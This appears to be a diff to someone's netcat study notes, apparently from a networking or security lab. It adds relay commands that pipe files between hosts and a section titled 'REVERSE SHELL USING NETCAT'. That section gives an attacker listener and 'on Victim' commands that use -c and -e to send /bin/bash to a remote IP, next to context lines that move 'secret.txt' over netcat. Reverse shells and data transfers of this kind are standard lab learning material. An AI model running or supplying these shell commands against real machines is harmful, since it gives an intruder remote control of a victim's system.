@@ -702,6 +702,18 @@ $ nc 172.16.82.106 1111 < secret.txt
 $ nc 192.168.1.1 3333 > newsecret.txt
 ```
 
+When T2 is pushing jpg (Client)
+Relay will do:
+nc -lvp 1111 < mypipe | nc -lvp 1234 > mypipe
+T1 (Internet host) will do:
+nc 172.16.40.10 1111 > 2steg.jpg
+
+
+When T2 is Listening (Server)
+Relay will do:
+nc -lvp 1111 < mypipe | nc 172.16.82.115 6789 > mypipe
+T1 will do:
+nc 172.16.40.10 1111 > 3steg.jpg
 
 
 
@@ -711,11 +723,19 @@ $ nc 192.168.1.1 3333 > newsecret.txt
 
 
 
-
-
-
-
-
+#REVERSE SHELL USING NETCAT
+##First listen for the shell on your device.
+```
+$ nc -lvp 9999
+```
+On Victim using -c :
+```
+$ nc -c /bin/bash 10.10.0.40 9999
+```
+On Victim using -e :
+```
+$ nc -e /bin/bash 10.10.0.40 9999
+```
 
 
 
